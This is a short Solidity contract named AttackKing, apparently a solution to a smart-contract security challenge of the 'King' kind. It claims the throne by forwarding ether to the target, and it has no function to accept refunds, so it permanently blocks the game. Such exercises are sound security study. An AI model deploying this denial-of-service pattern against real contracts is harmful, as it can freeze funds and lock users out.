pragma solidity ^0.8.0;

contract AttackKing {
    constructor(address _king) payable {
        (bool success, ) = address(_king).call{value: msg.value}("");
        require(success, "Tx failed");
    }
}
